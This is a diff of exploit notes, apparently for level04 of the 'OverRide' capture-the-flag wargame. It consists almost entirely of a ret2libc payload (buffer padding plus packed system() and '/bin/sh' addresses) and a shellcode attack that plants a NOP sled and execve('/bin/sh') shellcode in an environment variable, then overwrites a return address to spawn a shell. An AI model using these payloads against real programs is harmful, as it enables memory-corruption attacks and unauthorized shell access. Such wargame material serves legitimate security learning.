@@ -1,13 +1,22 @@
+
+************************************** ret2libc *******************************************
+
 import struct
 
-padding = "A"*140
-
-pad = "A" * 12
-
-zeros = "\x00"*4
+padding = "A"*156
 
 system = struct.pack ("I", 0xf7e6aed0)
 
 bin_sh = struct.pack ("I", 0xf7f897ec)
 
-print padding + zeros + pad + system + "AAAA" + bin_sh
+print padding + system + "AAAA" + bin_sh
+
+************************************** shellcode *******************************************
+
+# injecting shellcode in environment variable . 
+export SHELLCODE=$(python -c 'print "\x90"*500 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
+
+# write the return address of child. with the address of our shellcode.
+level04@OverRide:~$ python -c 'print "A"*156 + "\xff\xff\xd7\x90"[::-1]' > /tmp/pyload
+
+level04@OverRide:~$ (cat /tmp/pyload ; cat ) | /home/users/level04/level04
